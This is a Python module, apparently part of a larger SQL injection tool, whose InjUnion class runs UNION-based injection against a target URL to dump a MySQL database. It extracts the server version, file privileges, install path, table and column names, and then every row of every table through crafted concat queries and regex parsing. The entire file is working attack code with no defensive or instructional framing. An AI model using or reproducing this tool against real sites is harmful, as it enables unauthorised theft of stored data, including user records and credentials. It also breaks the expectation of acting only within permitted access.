# -*- coding: utf-8 -*-
# -*- ver	: >=3.8.0 -*-
# -*- coder : CO0kie丶 -*-
# -*- time  : 20201119 -*-
import requests
import re
import pprint
from myhttp import HTTP

"""-----定义分隔符-----"""
Global_spilt = "!@Aa@!"
"""-----定义分隔符-----"""
pp = pprint.PrettyPrinter()


class InjUnion(HTTP):
    _url = None

    def Print(self, text):
        self._lock.acquire()
        print(f'>>{self._threadname} 联合脱库：{text}')
        self._lock.release()
        pass

    def _db_init(self) -> bool:
        """
        函数：用于脱库-系统数据库

        :return: T/F=返回是否脱库成功
        """
        if self._url is None:
            return False

        # 脱库_数据库版本
        if data := self.GET_RE(
                self._url,
                'concat(\'{0}\',@@VERSION,char(126))'.format(Global_spilt),
                '{0}(.*?)~'.format(Global_spilt)):
            self._db['系统数据库版本'] = data

        # 脱库_数据库文件权限
        if data := self.GET_RE(
                self._url,
                'concat(\'{0}\',@@secure_file_priv,char(126))'.format(Global_spilt),
                '{0}(.*?)~'.format(Global_spilt)):
            self._db['系统数据库文件权限'] = data

        # 脱库_数据库安装路径
        if data := self.GET_RE(
                self._url,
                'concat(\'{0}\',@@basedir,char(126))'.format(Global_spilt),
                '{0}(.*?)~'.format(Global_spilt)):
            self._db['系统数据库安装路径'] = data

        # 脱库_系统数据库db总数
        if data := self.GET_RE(
                self._url,
                'concat(\'{0}\',({1}),char(126))'.format(
                    Global_spilt,
                    'SELECT COUNT(*) FROM information_schema.schemata'),
                '{0}(.*?)~'.format(Global_spilt)):
            self._db['系统数据库db总数'] = data

        # 脱库_系统数据库tb总数
        if data := self.GET_RE(
                self._url,
                'concat(\'{0}\',({1}),char(126))'.format(
                    Global_spilt,
                    'SELECT COUNT(*) FROM information_schema.TABLES'),
                '{0}(.*?)~'.format(Global_spilt)):
            self._db['系统数据库tb总数'] = data

        # 脱库_本数据库db名
        if data := self.GET_RE(
                self._url,
                'concat(\'{0}\',({1}),char(126))'.format(
                    Global_spilt,
                    'SELECT DATABASE()'),
                '{0}(.*?)~'.format(Global_spilt)):
            self._db['本数据库db名'] = data

        # 脱库_本数据库tb数
        if data := self.GET_RE(
                self._url,
                'concat(\'{0}\',({1}),char(126))'.format(
                    Global_spilt,
                    'SELECT count(*) FROM information_schema.STATISTICS '
                    'WHERE TABLE_SCHEMA=database()'),
                '{0}(.*?)~'.format(Global_spilt)):
            self._db['本数据库tb数'] = data

        # 脱库_本数据库tb名
        if data := self.GET_RE(
                self._url,
                'concat(\'{0}\',({1}),char(126))'.format(
                    Global_spilt,
                    'SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.STATISTICS '
                    'WHERE TABLE_SCHEMA=database()'),
                '{0}(.*?)~'.format(Global_spilt)):
            self._db['本数据库tb名'] = data

        if len(self._db) > 0:
            return self._db_table()
        return False
        pass

    def _db_table(self) -> bool:
        """
        函数：脱库->数据库

        :return: T/F=成功脱库
        """

        for tb_name in self._db['本数据库tb名'].split(','):
            # print('脱库->', tb_name)
            columns, row_max = '', 0

            # 脱库_列名
            if data := self.GET_RE(
                    self._url,
                    'concat(\'{0}\',({1}),char(126))'.format(
                        Global_spilt,
                        'SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS '
                        f'WHERE TABLE_NAME = \'{tb_name}\' and TABLE_SCHEMA=database()'),
                    '{0}(.*?)~'.format(Global_spilt)):
                columns = data.split(',')
                self._tbs[tb_name] = [['行'] + columns]

            # 脱库_行数
            if data := self.GET_RE(
                    self._url,
                    'concat(\'{0}\',({1}),char(126))'.format(
                        Global_spilt,
                        'SELECT COUNT(*) FROM ' + tb_name),
                    '{0}(.*?)~'.format(Global_spilt)):
                row_max = data
                for i in range(row_max):
                    self._tbs[tb_name].append([i + 1])
                pass

            # 得到行数之后，按列脱
            for column in columns:
                if row_max == 0:
                    break
                # print(f'\t{row_max=},{column}')

                if data := self.GET_RE(
                        self._url,
                        'concat(\'{0}\',({1}),char(126))'.format(
                            Global_spilt,
                            f'SELECT GROUP_CONCAT({column}) FROM {tb_name}'),
                        '{0}(.*?)~'.format(Global_spilt)):
                    data = data.split(',')
                    # print(f'\t{data=}')

                    # 循环将文件存到字典中
                    for i in range(row_max):
                        self._tbs[tb_name][i + 1].append(data[i])
                    pass
                pass

        return True
        pass

    def __init__(self, Lock, Name: str, Info: dict):
        """
        构造函数：初始化联合注入类

        :param Lock: 线程锁
        :param Name: 线程名
        :param Info: 传入的信息字典
        """
        if '脱库' in Info:
            return
        Info['注入方式']['EXP'] = '基于联合注入'
        Info['脱库'] = {'数据库': {}, '数据表': {}}

        self._lock = Lock
        self._threadname = Name
        self._url = Info['注入方式']['基于联合注入']
        self._db = Info['脱库']['数据库']
        self._tbs = Info['脱库']['数据表']
        self._db_init()
        pass

    pass
